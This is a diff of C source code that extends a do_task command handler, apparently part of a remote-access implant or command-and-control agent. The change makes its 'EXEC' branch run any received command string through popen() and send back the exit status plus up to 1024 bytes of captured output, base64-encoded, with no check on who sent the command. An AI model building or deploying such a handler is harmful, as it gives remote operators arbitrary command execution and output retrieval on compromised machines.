@@ -11,8 +11,9 @@
 
 #include "macros.h"
 
-#define MAX_DATA_SIZE 64000  // a bit smaller than the maximum TCP/UDP payload sizes
-#define IP4_LEN_MAX 16  // xxx.xxx.xxx.xxx\0
+#define MAX_DATA_SIZE 64000   // a bit smaller than the maximum TCP/UDP payload sizes
+#define IP4_LEN_MAX 16        // xxx.xxx.xxx.xxx\0
+#define MAX_EXEC_OUTPUT 1024  // max bytes of stdout to capture from EXEC commands
 
 char *do_task(char *cmd_str)
 {
@@ -55,13 +56,24 @@ char *do_task(char *cmd_str)
     // EXEC
     if (0 == strncmp(cmd_str, "EXEC ", 5))
     {
-        char res_str[16] = {0};
-        char *cmd = cmd_str + 5;
-        
-        int sys_ret = system(cmd);
+        char *out_buf = (char *)calloc(MAX_EXEC_OUTPUT + 1, sizeof(char));   // null terminator
+        char *res_str = (char *)calloc(MAX_EXEC_OUTPUT + 16, sizeof(char));  // + space for int
+        if (NULL != out_buf && NULL != res_str)
+        {
+            char *cmd = cmd_str + 5;
+            FILE *out  = popen(cmd, "r");
+            if (NULL != out)
+            {
+                int sys_ret = -1;
+                (void)fread(out_buf, sizeof(char), MAX_EXEC_OUTPUT, out);
+                sys_ret = pclose(out);
 
-        sprintf(res_str, "%d", sys_ret);
-        response = base64_encode(res_str, strlen(res_str), &response_len);
+                sprintf(res_str, "%d;%s", sys_ret, out_buf);
+                response = base64_encode(res_str, strlen(res_str), &response_len);
+            }
+            free(res_str);
+            free(out_buf);
+        }
     }
 
     return response;
